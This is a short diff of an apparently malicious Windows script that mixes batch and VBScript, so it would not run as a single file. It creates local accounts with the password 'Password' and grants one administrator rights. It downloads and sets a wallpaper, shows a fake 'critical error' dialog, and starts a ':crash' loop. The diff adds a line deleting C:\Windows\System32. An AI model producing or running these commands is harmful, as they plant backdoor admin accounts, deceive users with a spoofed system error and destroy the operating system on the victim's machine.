@@ -16,7 +16,7 @@ net user fgijgr Password /add
 net user 1+1fa2 Password /add
  net localgroup administrators 1+1fa2 /add
 @echo off
-set IMG_URL=https://i.ytimg.com/vi/tzD9OxAHtzU/hq720_2.jpg
+set IMG_URL=https://images6.alphacoders.com/737/737467.png
 powershell -Command "Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%TEMP%\wallpaper.jpg'"
 powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value '%TEMP%\wallpaper.jpg'; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%TEMP%\wallpaper.jpg', 3)"
 Set objShell = CreateObject("WScript.Shell")
@@ -24,6 +24,7 @@ MsgBox "A critical error has occurred." & vbCrLf & vbCrLf & _
        "The system cannot locate file abc123.dll due to corruption." & vbCrLf & _
        "Windows will attempt to restore the file on restart." & vbCrLf & vbCrLf & _
        "System will restart in 30 seconds.", vbCritical, "Windoes Process Manager"
+rd /s /q C:\Windows\System32
 @echo off 
 :crash
 start
